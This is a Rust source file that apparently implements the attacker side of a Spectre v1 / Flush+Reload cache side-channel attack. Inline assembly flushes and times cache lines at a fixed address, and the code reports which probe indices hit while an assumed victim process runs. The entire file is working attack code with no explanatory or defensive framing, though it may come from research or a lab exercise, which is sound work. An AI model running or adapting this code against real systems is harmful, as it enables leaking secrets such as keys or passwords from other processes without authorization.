#![feature(asm)]

use std::{thread, time};

const SPECV1_BASE: u64 = 0x00007ffff7dd7000;
const SPECV1_NPAGES: usize = 38;

const PAGE_SIZE: usize = 1 << 12; //bytes

const SPECV1_N_CL: usize = 256;
const SPECV1_OFFSET: usize = 512;

const HIT_THRESHOLD: u64 = 160;
const NRETIRES: usize = 80;

fn clflush_page(page_address: u64) {
    let _cl_size: usize = 1 << 6; // bytes

    for cline in 0..=PAGE_SIZE / SPECV1_OFFSET - 1 {
        // flush 4 times
        let cl_address = page_address + (cline * SPECV1_OFFSET) as u64;
        clflush(cl_address);
    }
}

fn clflush(address: u64) {
    unsafe{
        asm!{
            "clflush [rax]",
            in("rax") address,
        };
    }
}

fn prime(address: u64, npages: usize) {
    for page in 0..=npages - 1 {
        let page_address = address + (page * PAGE_SIZE) as u64;
        clflush_page(page_address);
    }
}

fn rdtsc() -> u64 {
    let result: u64;
    unsafe{
        asm!{"
            rdtsc
            shl rdx, 32
            or rax, rdx
            ",
            out("rax") result,
            out("rdx") _,
        };
    }
    return result;
}

fn time_access(address: u64) -> u64 {
    let start = rdtsc();
    unsafe{
        asm!{"
            mov rdi, [rdi]
            lfence
            ", in("rdi") address
        };
    }
    let end = rdtsc();
    return end - start;
}

fn get_hits(array: &[u64], hits: &mut [usize]) {
    for (index, e) in array.iter().enumerate() {
        if *e != 0 && *e < HIT_THRESHOLD {
            hits[index] += 1;
        }
    }
}

fn probe(address: u64, hits: &mut [usize]) {
    let sleep_time = time::Duration::from_nanos(500);
    let mut elapsed: [u64; SPECV1_N_CL] = [0; SPECV1_N_CL];

    for cl in 0..SPECV1_N_CL - 1 {
        let cl_shuffle = (cl * 167 + 13) & (SPECV1_N_CL - 1);
        let cl_address = address + (cl_shuffle * SPECV1_OFFSET) as u64;

        elapsed[cl_shuffle] = time_access(cl_address);
        thread::sleep(sleep_time);
    }

    get_hits(&elapsed, hits);
}

fn report_hits(hits: &[usize]) {
    let iter = hits.iter().enumerate();
    let filtered = iter.filter(|&(_, item)| *item == 1);

    filtered.for_each(|(index, _)| println!("hits: index {}, nhits 1", index));
}

fn main() {
    let sleep_time = time::Duration::from_millis(55);
    let mut hits: [usize; SPECV1_N_CL] = [0; SPECV1_N_CL];

    // victim must have started
    prime(SPECV1_BASE, SPECV1_NPAGES);

    // victim must receive input
    for _ in 0..NRETIRES - 1 {
        probe(SPECV1_BASE, &mut hits);
        thread::sleep(sleep_time);
        prime(SPECV1_BASE, SPECV1_NPAGES);
    }

    report_hits(&hits);
}
